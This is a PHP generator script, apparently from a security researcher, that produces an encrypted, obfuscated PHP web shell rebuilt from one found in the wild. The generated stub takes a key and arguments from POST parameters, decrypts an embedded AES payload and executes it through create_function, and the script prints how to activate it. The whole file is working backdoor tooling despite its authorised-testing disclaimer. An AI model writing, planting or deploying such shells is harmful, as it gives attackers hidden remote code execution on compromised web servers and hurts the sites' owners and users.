<?php
/**
 * php_aes_shell_gen
 * This is a rebuild of some shell found in the wild
 * PHP < 7.20
 *
 * @author    prsecurity
 * @note      This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. Author specifically does not allow you to use this file, its parts or generated code on systems you 
 * are not authorized to test.
 */

/**
 * Options
 * Because I don't want to bother with parsing argvs in PHP, just edit options here.
 * real_key is your encryption key
 * code is your php payload that can take an argument as $k
 */

$real_key = "BUSHDID911";
$code = 'echo $k;';


/**** DONT WORRY ABOUT THIS ****/
$length = 5;$i_bytes = openssl_random_pseudo_bytes(8);$i = substr(bin2hex($i_bytes), 0, 5);$post_bytes = openssl_random_pseudo_bytes(8);$post = substr(bin2hex($post_bytes), 0, 8);$O = (strlen($i)*128)/5+64*2;$key=substr(hash("sha$O",$real_key),0,$O/4/2);$iv = substr(hash("sha$O",$i),0,$O/4/2/2);$d = base64_encode(openssl_encrypt($code, "AES-$O-CBC", $key, OPENSSL_RAW_DATA, $iv));
$shell = <<<'EOT'
<?php
if(($z=$_POST["%s"])&&($z)){
    $i="%s";$O = (strlen($i)*128)/5+64*2;$k=$z;$p=$_POST[$i];$d="%s";$k=substr(hash("sha$O",$k),0,$O/4/2);
    $i=substr(hash("sha$O",$i),0,$O/4/2/2);
    $O=openssl_decrypt(base64_decode($d),"AES-$O-CBC",$k,OPENSSL_RAW_DATA,$i);$k=create_function('$k',$O);$k($p);}
?>

EOT;
printf($shell, $post, $i, $d);
printf("\nTo activate the shell, send POST request to the script with \"%s\"=%s&%s=<script args>\n",$post,$real_key,$i);
